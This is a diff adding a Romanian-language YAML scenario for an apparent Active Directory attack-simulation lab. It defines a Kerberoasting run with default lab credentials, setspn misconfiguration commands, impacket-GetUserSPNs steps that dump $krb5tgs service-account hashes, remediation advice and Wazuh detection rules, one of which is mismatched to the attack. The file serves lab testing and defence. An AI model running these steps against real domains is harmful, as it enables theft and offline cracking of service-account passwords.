@@ -1,0 +1,96 @@
+id: kerberoasting
+name: Kerberoasting
+category: kerberos
+mitre: T1558.003
+
+description: |
+  Kerberoasting exploateaza mecanismul de ticketing Kerberos pentru
+  a obtine hash-uri ale parolelor conturilor de serviciu din AD.
+
+  Orice utilizator autentificat in domeniu poate cere un TGS (Ticket
+  Granting Service) pentru orice SPN (Service Principal Name) inregistrat.
+  TGS-ul este criptat cu hash-ul parolei contului de serviciu asociat,
+  deci atacatorul il poate descarca si sparge offline fara a lasa urme
+  de autentificare esuata.
+
+  Diferenta fata de AS-REP Roasting: Kerberoasting necesita credentiale
+  valide de domain user, dar poate targeta orice cont cu SPN inregistrat.
+
+  Tool Kali: impacket-GetUserSPNs
+
+misconfiguration_general: |
+  Conturi de serviciu cu SPN inregistrat si parole slabe sau vechi.
+  Parolele conturilor de serviciu de obicei nu respecta politicile
+  de complexitate aplicate userilor normali.
+
+misconfiguration_specific: |
+  SPNs inregistrate in acest laborator:
+    - svc.backup -> SPN: backup/svc.backup
+    - svc.web    -> SPN: HTTP/svc.web
+
+  Comenzi aplicate (rulate pe Windows Server inainte de atac):
+    setspn -a HTTP/svc.web corp\svc.web
+    setspn -a backup/svc.backup corp\svc.backup
+
+  Output asteptat: 2 hash-uri $krb5tgs in output-ul atacului,
+  cate unul pentru fiecare cont cu SPN inregistrat.
+
+remediation: |
+  1. Parole lungi si complexe (>=25 caractere) pentru conturile de serviciu,
+     sau foloseste gMSA (Group Managed Service Accounts) care rotesc
+     parola automat.
+
+  2. Auditeaza SPNs inregistrate:
+     Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+  3. Elimina SPNs neutilizate:
+     setspn -d <SPN> <user>
+
+  4. Limiteaza privilegiile conturilor de serviciu la minimul necesar.
+     Includerea unui cont de serviciu in grupul Domain Admins e o greseala
+     critica — Kerberoasting pe un astfel de cont ofera control total.
+
+  5. Activeaza Wazuh pentru Event ID 4769 (TGS Request) cu frecventa
+     ridicata de la acelasi host.
+
+parameters:
+  - name: dc_ip
+    label: "IP Domain Controller"
+    default: "10.10.128.2"
+    required: true
+  - name: domain
+    label: "Domeniul AD (FQDN)"
+    default: "corp.local"
+    required: true
+  - name: username
+    label: "User domeniu valid (pentru autentificare)"
+    default: "mihai.popa"
+    required: true
+  - name: password
+    label: "Parola userului"
+    default: "kk12345$"
+    required: true
+
+steps:
+  - run_on: kali
+    description: "Curata fisierele temporare din rulari anterioare"
+    command: "rm -f /tmp/kerberoast_hashes.txt /tmp/kerberoast_only.txt"
+
+  - run_on: kali
+    description: "Cere TGS pentru toate SPNs din domeniu si salveaza hash-urile"
+    command: "impacket-GetUserSPNs {{domain}}/{{username}}:'{{password}}' -dc-ip {{dc_ip}} -outputfile /tmp/kerberoast_hashes.txt 2>&1"
+    expect_nonzero_ok: true
+
+  - run_on: kali
+    description: "Afiseaza hash-urile obtinute"
+    command: "grep -E '^\\$krb5tgs' /tmp/kerberoast_hashes.txt | tee /tmp/kerberoast_only.txt && echo \"--- $(wc -l < /tmp/kerberoast_only.txt) hash(uri) gasite ---\""
+    expect_nonzero_ok: true
+
+detection:
+  wazuh_rules:
+    - id: 92652
+      description: "Successful Remote Logon via NTLM - possible pass-the-hash"
+    - id: 60106
+      description: "Windows: Logon Success"
+  mitre_technique: T1558.003
+  mitre_description: "Steal or Forge Kerberos Tickets: Kerberoasting"
